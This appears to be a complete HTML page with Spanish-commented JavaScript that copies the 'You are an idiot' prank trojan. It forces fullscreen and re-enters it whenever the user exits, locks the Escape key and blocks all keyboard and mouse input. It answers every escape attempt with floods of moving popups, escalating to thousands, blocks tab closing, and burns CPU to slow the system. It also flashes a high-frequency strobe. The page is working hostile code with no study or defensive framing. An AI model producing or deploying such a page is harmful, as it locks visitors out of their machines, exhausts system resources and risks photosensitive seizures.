<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>You are an idiot</title>
</head>
<body style="background:#000;overflow:hidden;margin:0;cursor:none;">

<div id="contenido" style="display:none;">
<h1 style="font-size:10vw;font-family:Arial;text-align:center;margin-top:20vh;color:#fff;animation:fl 0.08s infinite;text-shadow:0 0 30px #f00;">
YOU ARE AN IDIOT
</h1>
</div>

<style>
@keyframes fl { 
    0%{opacity:1;color:#f00} 12%{opacity:0;color:#0f0} 
    25%{opacity:1;color:#00f} 37%{opacity:0;color:#ff0}
    50%{opacity:1;color:#f0f} 62%{opacity:0;color:#0ff}
    75%{opacity:1;color:#fff} 87%{opacity:0;color:#f00}
    100%{opacity:1;color:#0f0}
}
*{margin:0;padding:0}
body{width:100vw;height:100vh}
#strobe{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;
  animation:strobeAnim 0.15s infinite;}
@keyframes strobeAnim{0%{background:#000}33%{background:#fff}66%{background:#f00}100%{background:#000}}
</style>

<div id="strobe"></div>

<script>
// ================================================================
// TRAMPA NIVEL DIOS - NO HAY ESCAPATORIA
// ================================================================

var wins = [];
var totalAbiertas = 0;
var MAX = 100000;
var enFullscreen = false;

// ================================================================
// 1. FULLSCREEN AUTOMÁTICO + KEYBOARD LOCK
// ================================================================

function entrarFullscreen() {
    var d = document.documentElement;
    var fs = d.requestFullscreen || d.webkitRequestFullscreen || 
             d.mozRequestFullScreen || d.msRequestFullscreen;
    if (fs) {
        fs.call(d).then(function() {
            enFullscreen = true;
            // BLOQUEAR TECLA ESCAPE - hay que mantenerla 3 segundos
            if (navigator.keyboard && navigator.keyboard.lock) {
                navigator.keyboard.lock(['Escape']).catch(function(){});
            }
            document.getElementById('contenido').style.display = 'block';
            lanzarTormenta();
        }).catch(function() {
            // Si falla, intentamos igual
            document.getElementById('contenido').style.display = 'block';
            lanzarTormenta();
        });
    } else {
        document.getElementById('contenido').style.display = 'block';
        lanzarTormenta();
    }
}

// Si salen de fullscreen, VOLVEMOS A ENTRAR INMEDIATAMENTE
document.addEventListener('fullscreenchange', function() {
    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
        enFullscreen = false;
        // Volver a entrar
        entrarFullscreen();
        // Y abrir 100 popups de castigo
        for (var i = 0; i < 100; i++) {
            setTimeout(function() { dispararUnPopup('open.html'); }, i * 3);
        }
    }
});

document.addEventListener('webkitfullscreenchange', function() {
    if (!document.webkitFullscreenElement) {
        entrarFullscreen();
        for (var i = 0; i < 100; i++) {
            setTimeout(function() { dispararUnPopup('open.html'); }, i * 3);
        }
    }
});

// ================================================================
// 2. BLOQUEO TOTAL DE TECLADO
// ================================================================

document.addEventListener('keydown', function(e) {
    // Bloquear TODO
    e.preventDefault();
    e.stopPropagation();
    e.stopImmediatePropagation();
    
    var tecla = e.key || '';
    var codigo = e.keyCode || e.which || 0;
    
    // Cada tecla = más popups - castigo por intentar escapar
    dispararUnPopup('open.html');
    
    // Si intenta F11, Ctrl+W, Alt+F4 etc - castigo MAYOR
    if (tecla === 'F11' || tecla === 'Escape' || tecla === 'F4' || 
        codigo === 122 || codigo === 27 || codigo === 115 ||
        (e.ctrlKey && (tecla === 'w' || tecla === 'W' || tecla === 'n' || tecla === 'N' || tecla === 't' || tecla === 'T')) ||
        (e.altKey && (tecla === 'F4' || tecla === 'Tab' || tecla === 'f4')) ||
        (e.metaKey && (tecla === 'w' || tecla === 'q' || tecla === 'W' || tecla === 'Q'))) {
        
        for (var i = 0; i < 20; i++) {
            setTimeout(function() { dispararUnPopup('open.html'); }, i * 2);
        }
    }
    
    return false;
}, true);

// También capturar keyup
document.addEventListener('keyup', function(e) {
    e.preventDefault();
    e.stopPropagation();
    return false;
}, true);

// ================================================================
// 3. BLOQUEO DE CLICK (cada click = más ventanas)
// ================================================================

document.addEventListener('click', function(e) {
    e.preventDefault();
    for (var i = 0; i < 10; i++) {
        setTimeout(function() { dispararUnPopup('open.html'); }, i * 2);
    }
    return false;
}, true);

document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
    return false;
}, true);

// ================================================================
// 4. PREVENIR CIERRE DE PESTAÑA
// ================================================================

window.onbeforeunload = function(e) {
    // Disparar popups antes de cerrar
    for (var i = 0; i < 50; i++) {
        dispararUnPopup('open.html');
    }
    return "¡No puedes escapar!";
};

// ================================================================
// 5. SISTEMA DE POPUPS - 1 POPUP POR EVENTO
// ================================================================

function dispararUnPopup(url) {
    if (totalAbiertas >= MAX) return;
    
    function handler(e) {
        document.removeEventListener('keydown', handler);
        
        try {
            var nombreUnico = 'w' + Date.now() + '_' + totalAbiertas + '_' + 
                              Math.random().toString(36).substr(2,8);
            var left = Math.random() * (screen.width - 20);
            var top = Math.random() * (screen.height - 20);
            
            var p = window.open(url, nombreUnico,
                'width=180,height=175,left=' + left + ',top=' + top + 
                ',menubar=no,status=no,toolbar=no,resizable=no,scrollbars=no,location=no');
            
            if (p && !p.closed) {
                wins.push(p);
                totalAbiertas++;
                hacerBailar(p);
            }
        } catch(e) {}
    }
    
    document.addEventListener('keydown', handler);
    
    var evt = new KeyboardEvent('keydown', {
        key: 'Enter', keyCode: 13, which: 13,
        code: 'Enter', bubbles: true, cancelable: true
    });
    document.dispatchEvent(evt);
}

// ================================================================
// 6. HACER BAILAR VENTANAS - MOVIMIENTO CAÓTICO
// ================================================================

function hacerBailar(p) {
    var x = Math.random() * (screen.width - 200);
    var y = Math.random() * (screen.height - 200);
    var dx = (Math.random() - 0.5) * 40;
    var dy = (Math.random() - 0.5) * 40;
    var angulo = 0;
    
    function baila() {
        if (!p || p.closed) return;
        try {
            angulo += 0.1;
            x += dx + Math.sin(angulo) * 5;
            y += dy + Math.cos(angulo) * 5;
            
            if (x < 0 || x > screen.width - 180) dx *= -1;
            if (y < 0 || y > screen.height - 175) dy *= -1;
            
            // Cambios aleatorios de dirección
            if (Math.random() < 0.03) {
                dx = (Math.random() - 0.5) * 50;
                dy = (Math.random() - 0.5) * 50;
            }
            
            p.moveTo(Math.round(x), Math.round(y));
            try { p.focus(); } catch(e) {}
            
            setTimeout(baila, 6); // ~166 FPS
        } catch(e) {
            setTimeout(baila, 50);
        }
    }
    baila();
}

// ================================================================
// 7. PROCREATE - AL CIERRE EXPLOTA
// ================================================================

function procreate() {
    for (var i = 0; i < 60; i++) {
        setTimeout(function() { dispararUnPopup('open.html'); }, i * 3);
    }
}

// ================================================================
// 8. LANZAMIENTO MASIVO - TORMENTA PERFECTA
// ================================================================

function lanzarTormenta() {
    // OLEADA 0: 200 inmediatos
    for (var i = 0; i < 200; i++) {
        setTimeout(function() { dispararUnPopup('open.html'); }, i * 5);
    }
    
    // OLEADA 1: 500 en 2 segundos
    setTimeout(function() {
        for (var i = 0; i < 500; i++) {
            setTimeout(function() { dispararUnPopup('open.html'); }, i * 4);
        }
    }, 2000);
    
    // OLEADA 2: 1000 en 2 segundos más
    setTimeout(function() {
        for (var i = 0; i < 1000; i++) {
            setTimeout(function() { dispararUnPopup('open.html'); }, i * 2);
        }
    }, 5000);
    
    // OLEADA 3: 5000 masivos
    setTimeout(function() {
        for (var i = 0; i < 5000; i++) {
            setTimeout(function() { dispararUnPopup('open.html'); }, i * 1);
        }
    }, 10000);
    
    // REFUERZO CONSTANTE: 300 popups/segundo para siempre
    var intervaloRapido = setInterval(function() {
        dispararUnPopup('open.html');
    }, 3);
    
    // CADA 5 SEGUNDOS: ráfaga de 200
    setInterval(function() {
        for (var i = 0; i < 200; i++) {
            setTimeout(function() { dispararUnPopup('open.html'); }, i * 1);
        }
    }, 5000);
    
    // CADA 30 SEGUNDOS: megaoleada de 2000
    setInterval(function() {
        for (var i = 0; i < 2000; i++) {
            setTimeout(function() { dispararUnPopup('open.html'); }, i * 0.5);
        }
    }, 30000);
}

// ================================================================
// 9. PREVENIR QUE ABRAN Task Manager (Windows)
// ================================================================

// No se puede bloquear Ctrl+Shift+Esc desde JS pero podemos:
// - Saturar el event loop para que el sistema se ponga lentísimo
// - Abrir popups sin parar para consumir RAM al máximo

function saturarSistema() {
    // Consumir CPU creando bucles infinitos controlados
    var inicio = Date.now();
    while (Date.now() - inicio < 100) {
        Math.sqrt(Math.random() * 999999);
    }
    setTimeout(saturarSistema, 50);
}

// ================================================================
// INICIO
// ================================================================

// 1. Detectar primer click o tecla para iniciar
document.addEventListener('click', function inicio() {
    document.removeEventListener('click', inicio);
    document.removeEventListener('keydown', inicio);
    entrarFullscreen();
    saturarSistema();
}, true);

document.addEventListener('keydown', function inicio(e) {
    e.preventDefault();
    document.removeEventListener('click', inicio);
    document.removeEventListener('keydown', inicio);
    entrarFullscreen();
    saturarSistema();
}, true);

// Si no hay interacción en 3 segundos, forzamos igual
setTimeout(function() {
    if (!enFullscreen) {
        entrarFullscreen();
        saturarSistema();
    }
}, 3000);

// Al cerrar
window.onunload = procreate;
</script>

</body>
</html>
